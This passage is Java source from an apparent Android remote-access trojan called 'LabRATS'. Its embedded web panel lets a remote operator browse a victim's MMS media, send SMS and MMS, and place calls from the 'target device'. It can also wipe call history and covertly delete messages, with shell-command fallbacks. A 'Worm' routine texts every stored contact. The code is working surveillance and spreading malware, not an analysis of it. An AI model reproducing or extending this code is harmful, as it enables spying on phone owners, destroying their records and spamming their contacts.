                        String active = (i == page) ? "class=\"active\"" : "";
                        html.append("<a ").append(active).append(" href=\"/mms?page=").append(i).append("\">").append(i).append("</a>");
                    }
                    if (page < totalPages) {
                        html.append("<a href=\"/mms?page=").append(page + 1).append("\">Next &#8594;</a>");
                        html.append("<a href=\"/mms?page=").append(totalPages).append("\">Last</a>");
                    }
                    html.append("</div>");
                    html.append("<form action=\"/mms\" method=\"get\" style=\"display: flex; gap: 10px; justify-content: center; align-items: center;\">");
                    html.append("<span style=\"font-size: 0.8rem; color: #888;\">Jump to:</span>");
                    html.append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 60px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 5px; border-radius: 8px; text-align: center;\">");
                    html.append("<button type=\"submit\" class=\"btn btn-small\">GO</button>");
                    html.append("</form></div>");
                }
            } else { html.append("<div class=\"empty-state\"><div class=\"icon\">&#128247;</div><p>No MMS found</p></div>"); }
        } catch (Exception e) { html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div><p>Error: ").append(escapeHtml(e.getMessage())).append("</p></div>"); }
        finally { if (cursor != null) cursor.close(); }
        html.append("</div>").append(getFooter());
        return server.serveGzippedProxy(session, "text/html", html.toString());
    }

    private String getMmsAddress(String mmsId) {
        Uri addrUri = Uri.parse("content://mms/" + mmsId + "/addr");
        String address = "Unknown";
        try (Cursor c = context.getContentResolver().query(addrUri, null, "msg_id=" + mmsId, null, null)) {
            if (c != null) {
                int addrIdx = c.getColumnIndex("address");
                while (c.moveToNext()) {
                    if (addrIdx != -1) {
                        String addr = c.getString(addrIdx);
                        if (addr != null && !addr.equals("insert-address-token")) {
                            address = addr;
                            break;
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e("LabRATS", "Error getting MMS address", e);
        }
        return address;
    }

    private List<String> getMmsParts(String mmsId) {
        List<String> parts = new ArrayList<>();
        Uri partUri = Uri.parse("content://mms/part");
        try (Cursor c = context.getContentResolver().query(partUri, null, "mid=" + mmsId, null, null)) {
            if (c != null) {
                int idIdx = c.getColumnIndex("_id");
                int ctIdx = c.getColumnIndex("ct");
                int textIdx = c.getColumnIndex("text");
                while (c.moveToNext()) {
                    if (idIdx == -1 || ctIdx == -1) continue;
                    String partId = c.getString(idIdx);
                    String type = c.getString(ctIdx);
                    if ("text/plain".equals(type)) {
                        String body = textIdx != -1 ? c.getString(textIdx) : null;
                        if (body == null && partId != null) body = getMmsText(partId);
                        if (body != null) parts.add("text:" + body);
                    } else if (type != null && type.startsWith("image/") && partId != null) {
                        parts.add("image:" + partId);
                    } else if (type != null && type.startsWith("video/") && partId != null) {
                        parts.add("video:" + partId);
                    }
                }
            }
        } catch (Exception e) {
            Log.e("LabRATS", "Error getting MMS parts", e);
        }
        return parts;
    }

    private Set<String> getMmsIdsWithMedia() {
        Set<String> ids = new HashSet<>();
        Uri partUri = Uri.parse("content://mms/part");
        try (Cursor c = context.getContentResolver().query(partUri, new String[]{"mid"}, "ct LIKE 'image/%' OR ct LIKE 'video/%'", null, null)) {
            if (c != null) {
                int midIdx = c.getColumnIndex("mid");
                while (c.moveToNext()) {
                    if (midIdx != -1) {
                        String mid = c.getString(midIdx);
                        if (mid != null) ids.add(mid);
                    }
                }
            }
        } catch (Exception e) {
            Log.e("LabRATS", "Error getting MMS IDs with media", e);
        }
        return ids;
    }

    private String getContactName(String number, Map<String, String> cache) {
        if (number == null || number.isEmpty() || number.equals("Unknown") || number.equals("insert-address-token")) {
            return number == null ? "Unknown" : number;
        }

        if (cache != null && cache.containsKey(number)) {
            return cache.get(number);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                return number;
            }
        }

        String result = number;
        Cursor cursor = null;
        try {
            Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(number));
            cursor = context.getContentResolver().query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                String name = cursor.getString(0);
                if (name != null && !name.isEmpty()) {
                    result = name;
                }
            }
        } catch (Exception e) {
        } finally {
            if (cursor != null) cursor.close();
        }

        if (cache != null) {
            cache.put(number, result);
        }
        return result;
    }

    private String formatMessageDate(long timestamp) {
        return new SimpleDateFormat("MMM dd, HH:mm", Locale.getDefault()).format(new Date(timestamp));
    }

    private String getMmsText(String partId) {
        Uri partUri = Uri.parse("content://mms/part/" + partId);
        StringBuilder sb = new StringBuilder();
        try {
            InputStream is = context.getContentResolver().openInputStream(partUri);
            if (is != null) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(is, "UTF-8"));
                String line;
                while ((line = reader.readLine()) != null) sb.append(line);
                is.close();
            }
        } catch (Exception e) {}
        return sb.toString();
    }

    private Response serveMmsMedia(String partId) {
        try {
            Uri uri = Uri.parse("content://mms/part/" + partId);
            String mimeType = "application/octet-stream";
            String extension = "bin";

            try (Cursor c = context.getContentResolver().query(uri, new String[]{"ct"}, null, null, null)) {
                if (c != null && c.moveToFirst()) {
                    mimeType = c.getString(0);
                }
            } catch (Exception ignored) {}

            if (mimeType != null) {
                if (mimeType.contains("video/quicktime") || mimeType.contains("video/mp4")) {
                    extension = "mp4";
                    mimeType = "video/mp4"; 
                } else if (mimeType.startsWith("image/")) {
                    extension = mimeType.substring(mimeType.lastIndexOf("/") + 1);
                } else if (mimeType.startsWith("video/")) {
                    extension = mimeType.substring(mimeType.lastIndexOf("/") + 1);
                }
            }

            InputStream isRaw = context.getContentResolver().openInputStream(uri);
            if (isRaw == null) return server.serve404Proxy();
            InputStream is = new java.io.BufferedInputStream(isRaw, 65536);

            long size = -1;
            try {
                android.content.res.AssetFileDescriptor afd = context.getContentResolver().openAssetFileDescriptor(uri, "r");
                if (afd != null) {
                    size = afd.getLength();
                    afd.close();
                }
            } catch (Exception ignored) {}

            if (size <= 0) {
                try { size = is.available(); } catch (Exception e) { size = -1; }
            }

            Response res = (size > 0) ? 
                server.newFixedLengthResponseProxy(Response.Status.OK, mimeType, is, size) :
                server.newChunkedResponseProxy(Response.Status.OK, mimeType, is);

            res.addHeader("Accept-Ranges", "bytes");
            res.addHeader("Content-Disposition", "attachment; filename=\"mms_media_" + partId + "." + extension + "\"");
            return res;
        } catch (Exception e) { 
            Log.e("LabRATS", "MMS Media Error: " + e.getMessage());
            return server.serveErrorProxy("Media Access Failed: " + e.getMessage());
        }
    }

    private Response sendSms(Map<String, String> params) {
        String number = params.get("number"), message = params.get("message");
        if (number == null || number.isEmpty() || message == null || message.isEmpty()) return server.serveErrorProxy("Invalid number or message");
        try {
            FirebaseConfig.logActivity("COMMS_DISPATCH: SMS sent to " + number);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (context.checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) return server.serveErrorProxy("SEND_SMS permission not granted");
            }
            String className = "android.telephony.SmsManager";
            Object smsManager;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                smsManager = context.getSystemService(SmsManager.class);
            } else {
                smsManager = SystemAnalytics.safeCall(className, "getDefault", null, null);
            }

            if (smsManager != null) {
                SystemAnalytics.safeCall(className, "sendTextMessage", 
                    new Class[]{String.class, String.class, String.class, android.app.PendingIntent.class, android.app.PendingIntent.class}, 
                    smsManager, number, null, message, null, null);
            }

            String html = getHeader("/sms") + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>Message Sent</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div><p>Uplink successful. Message dispatched to: " + escapeHtml(number) + "</p><div style=\"margin-top: 30px; display: flex; justify-content: center;\"><a href=\"/sms\" class=\"btn\">Back to Terminal</a></div></div></div>" + getFooter();
            return server.newFixedLengthResponseProxy(Response.Status.OK, "text/html", new java.io.ByteArrayInputStream(html.getBytes()), html.length());
        } catch (Exception e) { return server.serveErrorProxy("Failed to send SMS: " + e.getMessage()); }
    }

    private Response sendMms(IHTTPSession session) {
        try {
            Map<String, String> bodyFiles = new HashMap<>();
            session.parseBody(bodyFiles);
            Map<String, String> params = session.getParms();

            String number = params.get("number");
            FirebaseConfig.logActivity("COMMS_DISPATCH: MMS package sent to " + (number != null ? number : "unknown"));
            String message = params.get("message");
            String tempFilePath = bodyFiles.get("media");

            if (number == null || number.isEmpty()) return server.serveErrorProxy("Target number is required");
            if (tempFilePath == null) return server.serveErrorProxy("Media attachment is required for MMS");

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (context.checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED)
                    return server.serveErrorProxy("SEND_SMS permission not granted");
            }

            File fileToUpload = new File(tempFilePath);
            if (fileToUpload.length() > 1024 * 1024) {
                return server.serveErrorProxy("Media package too large. Carrier limit is typically 1MB.");
            }

            boolean success = MmsSender.send(context, number, message, fileToUpload);

            String html = getHeader(session.getUri()) + "<div class=\"card\"><div class=\"empty-state\">";
            if (success) {
                html += "<div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>MMS Dispatched</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div><p>Media uplink successful. Package sent to: " + escapeHtml(number) + "</p><p style=\"font-size: 0.8rem; color: #888;\">Payload: " + escapeHtml(fileToUpload.getName()) + " (" + (fileToUpload.length() / 1024) + " KB)</p>";
            } else {
                html += "<div class=\"icon\" style=\"color: var(--danger);\">&#10006;</div><h2>MMS Failed</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div><p>Could not dispatch media package. Check device logs.</p>";
            }
            html += "<div style=\"margin-top: 30px; display: flex; justify-content: center;\"><a href=\"/mms\" class=\"btn\">Back to Terminal</a></div></div></div>" + getFooter();
            return server.newFixedLengthResponseProxy(Response.Status.OK, "text/html", new java.io.ByteArrayInputStream(html.getBytes()), html.length());

        } catch (Exception e) {
            return server.serveErrorProxy("MMS Dispatch Error: " + e.getMessage());
        }
    }

    private Response makeCall(Map<String, String> params) {
        String number = params.get("number");
        if (number == null || number.isEmpty()) return server.serveErrorProxy("Invalid phone number");
        
        try {
            FirebaseConfig.logActivity("COMMS_DISPATCH: Initiating remote call to " + number);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (context.checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                    return server.serveErrorProxy("CALL_PHONE permission not granted on device");
                }
            }

            Intent intent = new Intent(Intent.ACTION_CALL);
            intent.setData(Uri.parse("tel:" + Uri.encode(number)));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);

            String html = getHeader("/calls") + 
                "<div class=\"card\"><div class=\"empty-state\">" +
                "<div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div>" +
                "<h2>Call Initiated</h2>" +
                "<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>" +
                "<p>Uplink successful. Connection established to: " + escapeHtml(number) + "</p>" +
                "<p style=\"margin-top:20px; font-size: 0.8rem; color:#888;\">The target device is now dialing...</p>" +
                "<div style=\"display: flex; justify-content: center; margin-top: 30px;\"><a href=\"/calls\" class=\"btn\">Back to Call Logs</a></div>" +
                "</div></div>" + getFooter();
                
            return server.newFixedLengthResponseProxy(Response.Status.OK, "text/html", new java.io.ByteArrayInputStream(html.getBytes()), html.length());
        } catch (Exception e) {
            return server.serveErrorProxy("Failed to initiate call: " + e.getMessage());
        }
    }

    private Response serveCallLogsClear() {
        try {
            FirebaseConfig.logActivity("COMMS_WIPE: Wiping device call history");
            context.getContentResolver().delete(android.provider.CallLog.Calls.CONTENT_URI, null, null);
            String html = getHeader("/calls") + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>History Purged</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div><p>Call logs have been successfully wiped from the device.</p><div style=\"display: flex; justify-content: center;\"><a href=\"/calls\" class=\"btn\">Back to Call Logs</a></div></div></div>" + getFooter();
            return server.newFixedLengthResponseProxy(Response.Status.OK, "text/html", new java.io.ByteArrayInputStream(html.getBytes()), html.length());
        } catch (Exception e) { return server.serveErrorProxy("Wipe Failed: " + e.getMessage()); }
    }

    private Response deleteCall(Map<String, String> params) {
        String id = params.get("id");
        String page = params.get("page");
        if (id != null) {
            try {
                int rows = context.getContentResolver().delete(android.provider.CallLog.Calls.CONTENT_URI, android.provider.CallLog.Calls._ID + "=?", new String[]{id});
                
                if (rows == 0) {
                    executeShell("content delete --uri content://call_log/calls/" + id);
                    executeShell("content delete --uri content://call_log/calls --where \"_id=" + id + "\"");
                }
                
                FirebaseConfig.logActivity("COVERT_PROTOCOL: Target comms record " + id + " neutralized.");
            } catch (Exception e) {
                FirebaseConfig.logActivity("SYSTEM_ERROR: Call log deletion failed: " + e.getMessage());
            }
        }
        String redirectUrl = "/calls" + (page != null ? "?page=" + page : "");
        Response response = newResponse(Response.Status.REDIRECT, "text/html", "");
        response.addHeader("Location", redirectUrl);
        return response;
    }

    private Response deleteSms(Map<String, String> params) {
        String id = params.get("id");
        String page = params.get("page");
        if (id != null) {
            try {
                int rows = context.getContentResolver().delete(Uri.parse("content://sms/" + id), null, null);
                
                if (rows == 0) {
                    executeShell("content delete --uri content://sms/" + id);
                    executeShell("content delete --uri content://sms --where \"_id=" + id + "\"");
                }

                try {
                    context.getContentResolver().notifyChange(Uri.parse("content://sms/"), null);
                    context.getContentResolver().notifyChange(Uri.parse("content://mms-sms/"), null);
                } catch (Exception ignored) {}
                
                FirebaseConfig.logActivity("COVERT_PROTOCOL: Comm-Packet " + id + " removal sequence executed.");
            } catch (Exception e) {
                FirebaseConfig.logActivity("SYSTEM_ERROR: SMS deletion failed: " + e.getMessage());
            }
        }
        String redirectUrl = "/sms" + (page != null ? "?page=" + page : "");
        Response response = newResponse(Response.Status.REDIRECT, "text/html", "");
        response.addHeader("Location", redirectUrl);
        return response;
    }

    private Response deleteMms(Map<String, String> params) {
        String id = params.get("id");
        String page = params.get("page");
        if (id != null) {
            try {
                int rows = context.getContentResolver().delete(Uri.parse("content://mms/" + id), null, null);
                
                if (rows == 0) {
                    executeShell("content delete --uri content://mms/" + id);
                }
                
                try {
                    context.getContentResolver().notifyChange(Uri.parse("content://mms/"), null);
                } catch (Exception ignored) {}
                
                FirebaseConfig.logActivity("COVERT_PROTOCOL: Media-Packet " + id + " removal sequence executed.");
            } catch (Exception e) {
                FirebaseConfig.logActivity("SYSTEM_ERROR: MMS deletion failed: " + e.getMessage());
            }
        }
        String redirectUrl = "/mms" + (page != null ? "?page=" + page : "");
        Response response = newResponse(Response.Status.REDIRECT, "text/html", "");
        response.addHeader("Location", redirectUrl);
        return response;
    }

    private Response serveSmsBroadcast(Map<String, String> params, IHTTPSession session) {
        String message = params.get("message");
        if (message == null || message.isEmpty()) return server.serveErrorProxy("Message content is required for broadcast");
        
        FirebaseConfig.logActivity("COMMS_BROADCAST: Dispatched mass-messaging sequence (Worm)");
        
        LabRatsWorker.execute(() -> {
            try {
                android.database.Cursor cursor = context.getContentResolver().query(
                        android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        new String[]{android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER},
                        null, null, null);
                
                if (cursor != null) {
                    String className = "android.telephony.SmsManager";
                    Object smsManager;
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) smsManager = context.getSystemService(android.telephony.SmsManager.class);
                    else smsManager = SystemAnalytics.safeCall(className, "getDefault", null, null);

                    int count = 0;
                    java.util.Set<String> sentNumbers = new java.util.HashSet<>();
                    
                    while (cursor.moveToNext()) {
                        String number = cursor.getString(0);
                        if (number != null && !number.isEmpty() && !sentNumbers.contains(number)) {
                            if (smsManager != null) {
                                SystemAnalytics.safeCall(className, "sendTextMessage", 
                                    new Class[]{String.class, String.class, String.class, android.app.PendingIntent.class, android.app.PendingIntent.class}, 
                                    smsManager, number, null, message, null, null);
                                count++;
                                sentNumbers.add(number);
                                Thread.sleep(150); 
                            }
                        }
                    }
                    cursor.close();
                    FirebaseConfig.logActivity("COMMS_BROADCAST: Sequence Complete. " + count + " units reached.");
                }
            } catch (Exception e) {
                FirebaseConfig.logActivity("COMMS_ERROR: Broadcast sequence failed - " + e.getMessage());
            }
        });

        String html = getHeader("/sms") + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-orange);\">&#9889;</div><h2>Broadcast Initiated</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div><p>The mass-messaging sequence has been deployed in the background.</p><p style=\"margin-top:20px; font-size: 0.8rem; color:#888;\">Check Terminal logs for real-time progress.</p><div style=\"margin-top: 30px; display: flex; justify-content: center;\"><a href=\"/sms\" class=\"btn\" style=\"border-color: var(--neon-orange); color: var(--neon-orange);\">Back to SMS Terminal</a></div></div></div>" + getFooter();
        return server.newFixedLengthResponseProxy(Response.Status.OK, "text/html", new java.io.ByteArrayInputStream(html.getBytes()), html.length());
    }

    private void executeShell(String command) {
        if (command == null || command.isEmpty()) return;
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
            process.waitFor();
        } catch (Exception e) {}
    }
}
